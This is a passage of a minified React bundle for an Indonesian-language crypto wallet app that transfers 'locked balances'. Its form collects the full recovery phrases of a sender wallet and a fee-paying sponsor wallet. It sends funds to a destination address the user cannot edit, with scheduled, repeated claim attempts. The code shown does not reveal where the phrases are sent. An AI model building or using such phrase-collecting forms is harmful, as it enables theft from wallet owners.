                        className: "text-muted-foreground text-sm",
                        children: "Biaya dibayar oleh sponsor. Masukkan rincian dompet untuk memulai transfer."
                    })]
                }), !s.length && (0,
                t.jsx)(G, {
                    variant: "default",
                    className: "bg-secondary/40 border border-border/50",
                    children: (0,
                    t.jsx)(Q, {
                        children: "Tidak ada saldo yang terkunci tersedia. Silakan periksa tab Koin Terkunci terlebih dahulu."
                    })
                }), (0,
                t.jsxs)("form", {
                    onSubmit: handleFormSubmit,
                    className: "space-y-4",
                    children: [(0,
                    t.jsxs)("div", {
                        className: "space-y-2",
                        children: [(0,
                        t.jsx)(y, {
                            htmlFor: "senderPhrase",
                            children: "Frasa Dompet Pengirim"
                        }), (0,
                        t.jsxs)("div", {
                            className: "relative",
                            children: [(0,
                            t.jsx)(g, {
                                id: "senderPhrase",
                                type: u ? "text" : "password",
                                placeholder: "Masukkan frasa dompet pengirim...",
                                value: n,
                                onChange: e => l(_(e.target.value)),
                                className: "pr-10",
                                disabled: x || isScheduled
                            }), (0,
                            t.jsx)(h, {
                                type: "button",
                                variant: "ghost",
                                size: "icon",
                                className: "absolute right-0 top-0 h-full",
                                onClick: () => m(!u),
                                children: u ? (0,
                                t.jsx)(N.A, {
                                    size: 18
                                }) : (0,
                                t.jsx)(j.A, {
                                    size: 18
                                })
                            })]
                        })]
                    }),
                    (0,
                    t.jsxs)("div", {
                        className: "space-y-2",
                        children: [(0,
                        t.jsx)(y, {
                            htmlFor: "sponsorPhrase",
                            children: "Frasa Dompet Sponsor (Pembayar Biaya)"
                        }), (0,
                        t.jsxs)("div", {
                            className: "relative",
                            children: [(0,
                            t.jsx)(g, {
                                id: "sponsorPhrase",
                                type: sponsorPhraseVisible ? "text" : "password",
                                placeholder: "Masukkan frasa dompet sponsor...",
                                value: sponsorPhrase,
                                onChange: e => setSponsorPhrase(_(e.target.value)),
                                className: "pr-10",
                                disabled: x || isScheduled
                            }), (0,
                            t.jsx)(h, {
                                type: "button",
                                variant: "ghost",
                                size: "icon",
                                className: "absolute right-0 top-0 h-full",
                                onClick: () => setSponsorPhraseVisible(!sponsorPhraseVisible),
                                children: sponsorPhraseVisible ? (0,
                                t.jsx)(N.A, {
                                    size: 18
                                }) : (0,
                                t.jsx)(j.A, {
                                    size: 18
                                })
                            })]
                        })]
                    }),
                    (0,
                    t.jsxs)("div", {
                        className: "space-y-2",
                        children: [(0,
                        t.jsx)(y, {
                            htmlFor: "receiverPhrase",
                            children: "Alamat Dompet Penerima (Wallet Tujuan)"
                        }), (0,
                        t.jsxs)("div", {
                            className: "relative",
                            children: [(0,
                            t.jsx)(g, {
                                onCopy: e => e.preventDefault(),
                                onPaste: e => e.preventDefault(),
                                onCut: e => e.preventDefault(),
                                disabled: !0,
                                id: "receiverPhrase",
                                type: "text",
                                placeholder: "Alamat dompet tujuan...",
                                value: o,
                                onChange: e => i(_(e.target.value)),
                                className: "pr-10"
                            }), (0,
                            t.jsx)(h, {
                                type: "button",
                                variant: "ghost",
                                size: "icon",
                                className: "absolute right-0 top-0 h-full",
                                onClick: () => p(!f),
                                children: f ? (0,
                                t.jsx)(N.A, {
                                    size: 18
                                }) : (0,
                                t.jsx)(j.A, {
                                    size: 18
                                })
                            })]
                        })]
                    }), (0,
                    t.jsxs)("div", {
                        className: "space-y-2",
                        children: [(0,
                        t.jsx)(y, {
                            htmlFor: "claimableId",
                            children: "Saldo Terkunci (Balance ID)"
                        }), s.length > 0 ? (0,
                        t.jsxs)(et, {
                            onValueChange: e => {
                                d(e)
                            }
                            ,
                            value: c,
                            disabled: x || isScheduled,
                            children: [(0,
                            t.jsx)(el, {
                                children: (0,
                                t.jsx)(er, {
                                    placeholder: "Pilih Saldo Terkunci"
                                })
                            }), (0,
                            t.jsx)(ei, {
                                children: s.map( (e, s) => (0,
                                t.jsxs)(ec, {
                                    value: e.id,
                                    children: ["Balance #", s + 1, " - ", e.amount, " ", e.asset]
                                }, e.id))
                            })]
                        }) : (0,
                        t.jsx)(g, {
                            id: "claimableId",
                            type: "text",
                            placeholder: "Masukkan Balance ID...",
                            value: c,
                            onChange: e => d(e.target.value),
                            disabled: x || isScheduled
                        })]
                    }), 
                    // === TAMBAHAN: Input untuk mengatur kekuatan transaksi ===
                    (0,
                    t.jsxs)("div", {
                        className: "space-y-2",
                        children: [(0,
                        t.jsx)(y, {
                            htmlFor: "operationCount",
                            children: "Kekuatan Transaksi (Jumlah Operasi)"
                        }), (0,
                        t.jsx)(g, {
                            id: "operationCount",
                            type: "number",
                            min: "1",
                            max: "50",
                            value: operationCount,
                            onChange: e => {
                                const val = parseInt(e.target.value, 10);
                                setOperationCount(val > 0 ? val : 1);
                            },
                            disabled: x || isScheduled
                        }),
                        (0,
                        t.jsx)("p", {
                            className: "text-xs text-muted-foreground",
                            children: "Lebih tinggi lebih kuat tapi boros fee. Default: 1 (Paling hemat)."
                        })
                        ]
                    }),
                    (0,
                    t.jsxs)("div", {
                        className: "space-y-2",
                        children: [(0,
                        t.jsx)(y, {
                            htmlFor: "scheduleTime",
                            children: "Jadwalkan Waktu Klaim (Opsional)"
                        }), (0,
                        t.jsx)(g, {
                            id: "scheduleTime",
                            type: "datetime-local",
                            step: "1", 
                            value: schedule,
                            onChange: e => setSchedule(e.target.value),
                            disabled: x || isScheduled
                        })
                        ]
                    }),
                    (0,
                    t.jsx)(h, {
                        type: "submit",
                        className: "w-full mt-6 transition-all",
                        disabled: x || isScheduled || !n || !c || !sponsorPhrase,
                        children: isScheduled ? "TRANSFER DIJADWALKAN..." : x ? (0,
                        t.jsxs)(t.Fragment, {
                            children: [(0,
                            t.jsx)(w.A, {
                                className: "mr-2 h-4 w-4 animate-spin"
                            }), "MEMPROSES TRANSFER..."]
                        }) : (0,
                        t.jsxs)(t.Fragment, {
                            children: [schedule ? "Jadwalkan Transfer" : "Transfer Sekarang", (0,
                            t.jsx)(E.A, {
                                className: "ml-2 h-4 w-4"
                            })]
                        })
                    })]
                }), v && (0,
                t.jsxs)(t.Fragment, {
                    children: [(0,
                    t.jsx)(Z, {
                        className: "my-6"
                    }), (0,
                    t.jsx)(ep, {
                        errMsg: P,
                        transaction: v,
                        attempts: B,
                        maxAttempts: 1000,
                        status: C
                    })]
                })]
            })
        }
        function eh() {
            let[e,s] = (0,
            r.useState)("")
              , [a,l] = (0,
            r.useState)("")
              , [n,o] = (0,
            r.useState)([])
              , [i,f] = (0,
            r.useState)(!1)
              , p = async e => {
                if (e.preventDefault(),
                !a)
                    return void R.oR.error("Please enter a keyphrase");
                f(!0);
                try {
                    let {balances: e, publicKey: t} = await H(a.toLowerCase().trim());
                    console.log(e, t),
                    console.log("balance length", e.length, e, t),
                    o(e),
                    s(t),
                    0 === e.length && R.oR.info("No locked balances found for this wallet")
                } catch (e) {
                    console.error(e),
                    R.oR.error(e.message || "Failed to fetch locked balances")
                } finally {
                    f(!1)
                }
            }
            ;
            return (0,
            t.jsx)(S, {
                className: "border-border/40 backdrop-blur-sm bg-card/90 shadow-xl",
                children: (0,
                t.jsxs)(c, {
                    defaultValue: "locked-coins",
                    className: "w-full",
                    children: [(0,
                    t.jsx)("div", {
                        className: "p-4 md:p-6 border-b border-border/50",
                        children: (0,
                        t.jsxs)(d, {
                            className: "grid w-full grid-cols-2 h-12",
                            children: [(0,
                            t.jsx)(u, {
                                value: "locked-coins",
                                className: "text-sm md:text-base",
                                children: "Koin Terkunci"
                            }), (0,
                            t.jsx)(u, {
                                value: "transfer",
                                className: "text-sm md:text-base",
                                children: "Transfer"
                            })]
                        })
                    }), (0,
                    t.jsxs)("div", {
                        className: "p-4 md:p-6",
                        children: [(0,
                        t.jsx)(m, {
                            value: "locked-coins",
                            className: "mt-0",
                            children: (0,
                            t.jsx)(F, {
                                loading: i,
                                balances: n,
                                handleSubmit: p,
                                keyphrase: a,
                                setKeyphrase: l,
                                setWalletAddress: s
                            })
                        }), (0,
                        t.jsx)(m, {
                            value: "transfer",
                            className: "mt-0",
                            children: (0,
                            t.jsx)(ex, {
                                balances: n,
                                keyphrase: a,
                                setKeyphrase: l,
                                claimables: n,
                                walletAddress: e
                            })
                        })]
                    })]
                })
            })
        }
    }
    ,
    71281: () => {}
    ,
    74548: (e, s, a) => {
        Promise.resolve().then(a.bind(a, 15851)),
        Promise.resolve().then(a.bind(a, 47530))
    }
    ,
    77097: () => {}
    ,
    79838: () => {}
}, e => {
    var s = s => e(e.s = s);
    e.O(0, [810, 500, 441, 684, 358], () => s(74548)),
    _N_E = e.O()
}
]);
